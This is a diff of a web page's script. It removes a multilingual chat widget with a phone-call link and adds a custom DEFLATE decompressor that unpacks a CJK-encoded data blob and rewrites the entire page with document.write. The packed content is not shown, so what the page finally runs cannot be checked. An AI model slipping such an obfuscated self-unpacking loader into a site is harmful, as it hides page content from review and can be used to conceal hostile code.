-function k(){var x=Li.indexOf(document.documentElement.lang);return x<0?0:x}
-function add(t,c){var d=document.createElement('div');d.className='mb '+c;d.textContent=t;cm.appendChild(d);cm.scrollTop=cm.scrollHeight}
-function reply(n){add(S[n][k()],'bot');var a=document.createElement('a');a.className='mc';a.href='tel:+34912400498';a.textContent='📞 '+S.call[k()];cm.appendChild(a);cm.scrollTop=cm.scrollHeight}
-function ui(){var j=k();$('ct').textContent=S.title[j];ci.placeholder=S.ph[j];$('ca').textContent=S.call[j];cc.innerHTML='';['rv','pg','ub','cr','hr'].forEach(function(n){var b=document.createElement('button');b.textContent=S['c_'+n][j];b.onclick=function(){add(S['c_'+n][j],'usr');reply(n)};cc.appendChild(b)})}
-function send(){var q=ci.value.trim();if(!q)return;add(q,'usr');ci.value='';var n='df';for(var key in R){if(R[key].test(q.toLowerCase())){n=key;break}}reply(n)}
-$('cb').onclick=function(){cw.hidden=false;ui();if(first){add(S.hi[k()],'bot');first=0}};
-$('cx').onclick=function(){cw.hidden=true};
-$('cs').onclick=send;
-ci.addEventListener('keydown',function(e){if(e.key=='Enter')send()});
-$('lang').addEventListener('change',ui);
-})();
+function inf(d,n){var o=new Uint8Array(n),op=0,ip=0,bb=0,bc=0,i;
+function bits(c){while(bc<c){bb|=d[ip++]<<bc;bc+=8}var v=bb&((1<<c)-1);bb>>=c;bc-=c;return v}
+function build(l){var c=new Uint16Array(16),s=new Uint16Array(l.length),f=new Uint16Array(16),i;for(i=0;i<l.length;i++)c[l[i]]++;c[0]=0;for(i=1;i<16;i++)f[i]=f[i-1]+c[i-1];for(i=0;i<l.length;i++)if(l[i])s[f[l[i]]++]=i;return{c:c,s:s}}
+function dc(h){var code=0,first=0,x=0,len,k;for(len=1;len<16;len++){code|=bits(1);k=h.c[len];if(code-k<first)return h.s[x+(code-first)];x+=k;first+=k;first<<=1;code<<=1}return -1}
+var LB=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258],LE=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],DB=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],DE=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13];
+function codes(lh,dh){var y,l,t,z;for(;;){y=dc(lh);if(y<256)o[op++]=y;else if(y==256)return;else{y-=257;l=LB[y]+bits(LE[y]);t=dc(dh);z=DB[t]+bits(DE[t]);while(l--){o[op]=o[op-z];op++}}}}
+var last,t,l,lh,dh;
+do{last=bits(1);t=bits(2);
+if(t==0){bb=0;bc=0;l=d[ip]|d[ip+1]<<8;ip+=4;while(l--)o[op++]=d[ip++]}
+else if(t==1){l=new Uint8Array(288);for(i=0;i<288;i++)l[i]=i<144?8:i<256?9:i<280?7:8;lh=build(l);l=new Uint8Array(30);for(i=0;i<30;i++)l[i]=5;codes(lh,build(l))}
+else{var nl=bits(5)+257,nd=bits(5)+1,nc=bits(4)+4,or=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],cl=new Uint8Array(19),ll=new Uint8Array(nl+nd),ix=0,y,ln,r;
+for(i=0;i<nc;i++)cl[or[i]]=bits(3);var ch=build(cl);
+while(ix<nl+nd){y=dc(ch);if(y<16)ll[ix++]=y;else{ln=0;if(y==16){ln=ll[ix-1];r=3+bits(2)}else if(y==17)r=3+bits(3);else r=11+bits(7);while(r--)ll[ix++]=ln}}
+codes(build(ll.subarray(0,nl)),build(ll.subarray(nl)))}
+}while(!last);return o}
+setTimeout(function(){try{var s=document.getElementById('d').textContent.replace(/\s/g,''),n=25259,b=new Uint8Array(n),a=0,k=0,j=0,i;
+for(i=0;i<s.length;i++){a=a<<14|s.charCodeAt(i)-19968;k+=14;while(k>=8&&j<n){k-=8;b[j++]=a>>k&255;a&=(1<<k)-1}}
+var h=new TextDecoder('utf-8').decode(inf(b,74513));
+document.open();document.write(h);document.close()}catch(e){document.getElementById('m').textContent='Error: '+e.message}},0);
 </script>
-</body>
-</html>
+</body></html>
